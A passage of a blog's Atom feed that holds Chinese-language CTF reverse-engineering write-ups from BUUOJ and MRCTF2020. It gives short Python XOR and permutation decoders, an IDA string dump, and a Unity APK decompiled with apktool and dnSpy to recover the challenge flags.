class="number">0x1C</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x2E</span>, <span class="number">0x7C</span>, <span class="number">0x63</span>, <span class="number">0x45</span>, <span class="number">0xF4</span>, <span class="number">0x56</span>, <span class="number">0xF1</span>, <span class="number">0xB0</span>, <span class="number">0xD1</span>, <span class="number">0xE0</span>, <span class="number">0xF</span>, <span class="number">0x93</span>, <span class="number">0xD6</span>, <span class="number">0x1F</span>, <span class="number">0xCC</span>, <span class="number">0x4B</span>, <span class="number">0xCF</span>, <span class="number">0xDF</span>, <span class="number">0x55</span>, <span class="number">0xB9</span>, <span class="number">0x2B</span>, <span class="number">0x85</span>, <span class="number">0x31</span>, <span class="number">0x29</span>, <span class="number">0xFD</span>, <span class="number">0x3A</span>, <span class="number">0x5E</span>, <span class="number">0xDE</span>, <span class="number">3</span>, <span class="number">0xC6</span>, <span class="number">0xC1</span>, <span class="number">0xC5</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0xFC</span>, <span class="number">0xBE</span>, <span class="number">0xEC</span>, <span class="number">0xC0</span>, <span class="number">0xAD</span>, <span class="number">0xA4</span>, <span class="number">0xD0</span>, <span class="number">0x35</span>, <span class="number">0xB7</span>, <span class="number">0x51</span>, <span class="number">0xAB</span>, <span class="number">0x2D</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0x60</span>, <span class="number">0xAC</span>, <span class="number">0x30</span>, <span class="number">0xD4</span>, <span class="number">0xCB</span>, <span class="number">0x9B</span>, <span class="number">0x9A</span>, <span class="number">0xFB</span>, <span class="number">0x6F</span>, <span class="number">0xF7</span>, <span class="number">0x8E</span>, <span class="number">0xA0</span>, <span class="number">0x27</span>, <span class="number">0xC9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xor2:</span><br><span class="line">        res[i] ^= j</span><br><span class="line">    print(<span class="built_in">chr</span>(res[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> ()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到 flag: <code>1dc20f6e3d497d15cef47d9a66d6f1af</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;平台：BUUOJ&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="BUUOJ" scheme="https://s0uthwood.github.io/tags/BUUOJ/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020 reverse writeups</title>
    <link href="https://s0uthwood.github.io/2021/03/04/MRCTF2020-reverse-writeups/"/>
    <id>https://s0uthwood.github.io/2021/03/04/MRCTF2020-reverse-writeups/</id>
    <published>2021-03-04T08:38:52.000Z</published>
    <updated>2021-05-19T17:46:18.845Z</updated>
    
    <content type="html"><![CDATA[<p>平台：BUUOJ</p><p>做题的时候懒了，没写思路，暂时先贴上代码吧</p><a id="more"></a><h1 id="Transform"><a href="#Transform" class="headerlink" title="Transform"></a>Transform</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dword = [ <span class="number">9</span>, <span class="number">0xa</span>, <span class="number">0xf</span>, <span class="number">0x17</span>, <span class="number">0x7</span>, <span class="number">0x18</span>, <span class="number">0xc</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x3</span>, <span class="number">0x11</span>, <span class="number">0x20</span>, <span class="number">0x1D</span>, <span class="number">0x0b</span>, <span class="number">0x1e</span>, <span class="number">0x1b</span>, <span class="number">0x16</span>, <span class="number">0x4</span>, <span class="number">0x0d</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x2</span>, <span class="number">0x19</span>, <span class="number">0x5</span>, <span class="number">0x1f</span>, <span class="number">0x8</span>, <span class="number">0x12</span>, <span class="number">0x1a</span>, <span class="number">0x1c</span>, <span class="number">0xe</span>, <span class="number">0</span> ]</span><br><span class="line"></span><br><span class="line">flag = [ <span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7b</span>, <span class="number">0x7f</span>, <span class="number">0x75</span>, <span class="number">0x2b</span>, <span class="number">0x3c</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>, <span class="number">0x3f</span>]</span><br><span class="line">print(<span class="built_in">len</span>(dword), <span class="built_in">len</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dword)):</span><br><span class="line">    flag[i] ^= dword[i]</span><br><span class="line"></span><br><span class="line">code = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dword)):</span><br><span class="line">    code[dword[i]] = flag[i]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    print(<span class="built_in">chr</span>(code[i]), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p>flag: <code>MRCTF&#123;Tr4nsp0sltiON_Clph3r_1s_3z&#125;</code></p><h1 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;MSAWB~FXZ:J:`tQJ&quot;N@ bpdd&#125;8g&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) ^ i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p>flag: <code>MRCTF&#123;@_R3@1ly_E2_R3verse!&#125;</code></p><h1 id="hello-world-go"><a href="#hello-world-go" class="headerlink" title="hello_world_go"></a>hello_world_go</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000004D3C58 unk_4D3C58      db  66h ; f             ; DATA XREF: main_main:loc_49A40A↑o</span><br><span class="line">.rodata:00000000004D3C58                                         ; main_main+25C↑o</span><br><span class="line">.rodata:00000000004D3C59                 db  6Ch ; l</span><br><span class="line">.rodata:00000000004D3C5A                 db  61h ; a</span><br><span class="line">.rodata:00000000004D3C5B                 db  67h ; g</span><br><span class="line">.rodata:00000000004D3C5C                 db  7Bh ; &#123;</span><br><span class="line">.rodata:00000000004D3C5D                 db  68h ; h</span><br><span class="line">.rodata:00000000004D3C5E                 db  65h ; e</span><br><span class="line">.rodata:00000000004D3C5F                 db  6Ch ; l</span><br><span class="line">.rodata:00000000004D3C60                 db  6Ch ; l</span><br><span class="line">.rodata:00000000004D3C61                 db  6Fh ; o</span><br><span class="line">.rodata:00000000004D3C62                 db  5Fh ; _</span><br><span class="line">.rodata:00000000004D3C63                 db  77h ; w</span><br><span class="line">.rodata:00000000004D3C64                 db  6Fh ; o</span><br><span class="line">.rodata:00000000004D3C65                 db  72h ; r</span><br><span class="line">.rodata:00000000004D3C66                 db  6Ch ; l</span><br><span class="line">.rodata:00000000004D3C67                 db  64h ; d</span><br><span class="line">.rodata:00000000004D3C68                 db  5Fh ; _</span><br><span class="line">.rodata:00000000004D3C69                 db  67h ; g</span><br><span class="line">.rodata:00000000004D3C6A                 db  6Fh ; o</span><br><span class="line">.rodata:00000000004D3C6B                 db  67h ; g</span><br><span class="line">.rodata:00000000004D3C6C                 db  6Fh ; o</span><br><span class="line">.rodata:00000000004D3C6D                 db  67h ; g</span><br><span class="line">.rodata:00000000004D3C6E                 db  6Fh ; o</span><br><span class="line">.rodata:00000000004D3C6F                 db  7Dh ; &#125;</span><br></pre></td></tr></table></figure><h1 id="PixelShooter"><a href="#PixelShooter" class="headerlink" title="PixelShooter"></a>PixelShooter</h1><p>先使用NoxPlayer打开这个apk，发现游戏结束后有个flag信息，说得分不够高，说明flag会在游戏结束时根据得分获得</p><p>使用apktool解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> java -jar apktool_2.5.0.jar d PixelShooter.apk</span></span><br></pre></td></tr></table></figure><p>这个显然是unity3d逆向，找到 <code>/assets/bin/Data/Managed</code>，使用 dnSpy打开 <code>Assembly-CSharp.dll</code></p><p>看到有个gameController，其中有个gameOver</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GameOver</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.isGameOver = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">this</span>.UI.GetComponent&lt;UIController&gt;().GameOver(<span class="keyword">this</span>.score, <span class="keyword">this</span>.bestScore);</span><br><span class="line"><span class="keyword">if</span> (PlayerPrefs.HasKey(<span class="string">&quot;bestScore&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bestScore = Mathf.Max(<span class="keyword">this</span>.score, PlayerPrefs.GetInt(<span class="string">&quot;bestScore&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bestScore = <span class="keyword">this</span>.score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">base</span>.GetComponent&lt;AudioSource&gt;().Stop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个获取ui的函数，查看</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GameOver</span>(<span class="params"><span class="built_in">int</span> score, <span class="built_in">int</span> bestScore</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.pad.SetActive(<span class="literal">false</span>);</span><br><span class="line">Time.timeScale = <span class="number">0f</span>;</span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;您的飞机已坠毁\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (bestScore &lt; score)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> text2 = text;</span><br><span class="line">text = <span class="built_in">string</span>.Concat(<span class="keyword">new</span> <span class="built_in">object</span>[]</span><br><span class="line">&#123;</span><br><span class="line">text2,</span><br><span class="line"><span class="string">&quot;获得最高分:&quot;</span>,</span><br><span class="line">score,</span><br><span class="line"><span class="string">&quot;!\n&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line">PlayerPrefs.SetInt(<span class="string">&quot;bestScore&quot;</span>, score);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (score &lt; <span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line">text += <span class="string">&quot;少年继续努力！要拿到flag还差亿点点\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &lt; <span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line">text += <span class="string">&quot;战绩不错！但是要拿到flag还差亿点&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (score &lt; <span class="number">500</span>)</span><br><span class="line">&#123;</span><br><span class="line">text += <span class="string">&quot;惊人的成绩！！但是要拿到flag还差一点\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">text += <span class="string">&quot;MRCTF&#123;Unity_1S_Fun_233&#125;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Time.time - <span class="keyword">this</span>.lastTime &lt; <span class="number">15f</span>)</span><br><span class="line">&#123;</span><br><span class="line">text += <span class="string">&quot;以及，别作死啊！\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (Time.time - <span class="keyword">this</span>.lastTime &lt; <span class="number">60f</span>)</span><br><span class="line">&#123;</span><br><span class="line">text += <span class="string">&quot;以及注意闪避！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.gameOverText.text = text;</span><br><span class="line"><span class="keyword">this</span>.gameOverUI.SetActive(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;平台：BUUOJ&lt;/p&gt;
&lt;p&gt;做题的时候懒了，没写思路，暂时先贴上代码吧&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="BUUOJ" scheme="https://s0uthwood.github.io/tags/BUUOJ/"/>
    
  </entry>
  
</feed>
